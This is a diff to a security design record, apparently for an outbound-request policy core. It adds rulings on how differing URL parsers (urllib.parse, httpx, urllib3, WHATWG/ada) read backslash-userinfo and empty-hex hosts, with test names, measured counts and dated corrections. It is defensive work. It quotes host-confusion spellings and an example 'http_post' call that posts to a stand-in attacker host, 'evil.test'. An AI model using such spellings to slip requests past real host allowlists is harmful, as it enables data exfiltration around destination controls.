@@ -210,12 +210,128 @@ note.
   UNRESOLVED even with `evil.test` recorded untrusted. WHATWG percent-encodes
   the space, and the host is still `evil.test`
   (`test_residual_whitespace_in_a_url_path_hides_its_host`).
+- **An empty hex part is read as a name.** It was found by the A2 adversarial
+  run on WPT. WHATWG (ada) reads `https://0x.0x.0/` as `0.0.0.0`, and so does the
+  macOS libc resolver that httpx and urllib3 hand the name to; glibc does not.
+  `coerce_ip` raises on `int("0x", 16)` and reads `dns:0x.0`. It belongs to the
+  integer-spelling family and is fixed where `coerce_ip` is shared (A2's
+  `url_parse` milestone), not by Q1
+  (`test_residual_empty_hex_part_is_the_zero_address`).
 - **The first-emission race is rarely observable through the public API.** The
   unlocked window in this core is one `_merge` call, inside a much longer
   extraction. With the lock removed, the S22 first-emission test went red in 1 of
   3 measured runs. The lock's other guarantee, all-or-none visibility of a
   multi-entry write, went red in 20 of 20 runs on 3.12 and on 3.14. That second
   test is the reliable R4 detector. Both tests stay in the suite.
+
+## Ruling 2026-10-03 (A2, Q1): V-23 is amended — every reading of the split
+
+**V-23 said:** backslashes in the scheme-relative part are replaced with `/`
+before `urlsplit`, as WHATWG does, "so `https://evil.test\@corp.example/` has
+host `evil.test`". **Amended:** that is ONE reading of the authority split. A
+URL whose readings name different authorities names ALL of them. Each is its
+own finding, and the weakest decides the wire. That is R1's shape for mailbox
+parts, so the core stays consistent with itself. Ruled by the owner; it gates
+ENFORCE.
+
+**Why.** The real consumers disagree with each other, so "the host" depends on
+who reads the URL. Measured 2026-10-03 with httpx 0.28.1, urllib3 2.8.0 and
+ada-url 4.0.0:
+
+    https://corp.example\@evil.test/x    WHATWG (ada), urllib3: corp.example
+                                         httpx, urllib.parse:   evil.test
+
+Reading only the WHATWG side made `http_post(url="https://corp.example\@evil.test/collect")`,
+with `evil.test` recorded untrusted, come back **`principal`, AUTHORIZED**,
+while ~~httpx and urllib sent it~~ httpx sent it to `evil.test`. That is
+finding 1, the 1.15.0 userinfo-bypass shape in new code. Choosing one reading
+is choosing which transport may be bypassed.
+
+*[Corrected 2026-10-03, M0 milestone review: "httpx and urllib sent it" was
+false for urllib. `urllib.request` passes the raw netloc
+(`corp.example\@evil.test`) to http.client and reaches neither host. It is
+`urllib.parse`'s `urlsplit(...).hostname` that reads `evil.test`, and xaidr's
+own `ProtectedHttpClient._extract_host` decides destination policy with it.
+The ruling stands on httpx alone.]*
+
+~~Before the fix, the multi-oracle differential found 3,703 under-reads across
+31,752 generated spellings (urllib.parse 1,705, httpx 1,674, ada 324).~~
+*[Corrected, same review: those figures came from the FIRST grid, before it was
+extended, and cannot be regenerated from the committed one.]* On the committed
+corpus of **47,124 spellings**, the pre-fix core (base `25dc9de`) has **10,780
+under-reads** (urllib.parse 1,789, httpx 2,538, urllib3 945, ada 5,508). After
+the fix it has **none**, on CPython 3.12.2 (macOS) and on 3.10.21 and 3.12.14
+(Linux).
+
+*Pinned by:*
+- `Q1-backslash-userinfo-bypass`, `Q1-backslash-userinfo-mirror`,
+  `Q1-backslash-nonspecial-scheme`, `Q1-backslash-readings-agree` (does not
+  block) and `Q1-urlsplit-refusal`;
+- `test_q1_a_url_blocks_on_the_host_the_transport_reaches` (should_block under
+  ENFORCE);
+- `test_q1_a_poisoned_result_records_every_reading_of_its_url`;
+- `test_q1_every_reading_of_the_authority_split_is_a_finding`;
+- `V23-backslash`, whose findings changed to both hosts while its wire stayed
+  `unresolved`;
+- `tests/test_differential_oracles.py`, which is spellings × {urllib.parse,
+  httpx, urllib3, ada-url} and refuses if any oracle is missing (Q3).
+
+## Decisions made in the A2 build (M0) that still need a ruling
+
+Each is listed so it can be overruled, not so it can pass unnoticed.
+
+1. **The RFC 3986 reading is a written-out split, not this interpreter's
+   `urlsplit`. It reads exactly what CPython 3.12.2's `urlsplit(...).hostname`
+   reads, the most permissive version measured.** V-4 requires the same answer
+   on every interpreter, and `urlsplit` is not the same function on every
+   interpreter. Its bracketed-host validation, a security backport, raises on
+   `http://[::1]\@evil.test/` on CPython 3.10.21 and 3.12.14, and returns
+   `evil.test` on 3.12.2. httpx sends it to `evil.test` on all three.
+   - 3.12.2's netloc checks are reproduced exactly: brackets balance; the
+     netloc's FIRST bracketed segment is IPv6 or IPvFuture; no NFKC fold into a
+     delimiter.
+   - Its host rule is reproduced exactly: the part between the host's first
+     `[` and the next `]`, otherwise the part before the first `:`.
+   - Measured on the committed corpus: the reading matches 3.12.2's
+     `urllib.parse` on every spelling (zero under-reads and zero over-reads
+     there).
+
+   *[Corrected 2026-10-03, M0 milestone review: an earlier version of this
+   entry described one bracket rule for every reading and read past a bracket
+   anywhere. That over-read hosts no consumer reads (`http:ev[il].test` as
+   `il`), and its first repair under-read what 3.12.2 reads.]*
+
+   **Where `urlsplit` refused the WHATWG string, WHATWG's own bracket rule
+   applies:** a `[` must open the host and enclose an IPv6 literal, and any
+   other bracket means no host.
+   (`test_q1_every_reading_…[http://[::1]\@evil.test/x]`, red on Linux with
+   `urlsplit`, green on all three interpreters with the split.)
+2. **Where `urlsplit` refuses the WHATWG string, the value stays `parse_failure`
+   (decision 7), and every host the split finds is a finding beside it.** This
+   is Q1 applied to a refusal, in R1's shape. It was found by the adversarial run on WPT
+   `urltestdata.json` (web-platform-tests `c48d587`): `http://&a:foo(b]c@d:2/`
+   goes to `d` through httpx, urllib3 and WHATWG, while the core read nothing
+   (`Q1-urlsplit-refusal`).
+3. **`authority_of` returns `None` for a value with two authorities**, exactly
+   as it does for a two-mailbox list. It never picks one, because either pick
+   is a host some consumer does not send to.
+   (`test_q1_authority_of_answers_none_for_a_value_with_two_authorities`.)
+4. **One over-read class is allowed in the differential:
+   `urlsplit-bracket-validation`.** These are hosts CPython 3.12.2's
+   `urllib.parse` reads and the post-backport releases refuse. The reason is
+   checked both ways by
+   `test_the_named_over_read_class_stands_for_a_measured_interpreter`: on an
+   interpreter whose `urlsplit` reads like 3.12.2, the class must absorb
+   NOTHING; on a post-backport one, it must be needed.
+
+   Measured on the committed corpus: it absorbs **0** on macOS 3.12.2 and
+   **115** on Linux 3.10.21 and on 3.12.14.
+
+   *[Corrected 2026-10-03, M0 milestone review: an earlier version said "31
+   spellings, Linux only", and gave the reason as "urllib.request on such an
+   interpreter sends there". Both were wrong. urllib.request passes the raw
+   netloc on and reaches neither host, and the count was from an earlier grid
+   and an earlier split.]*
 
 ## What A1 does not do
 
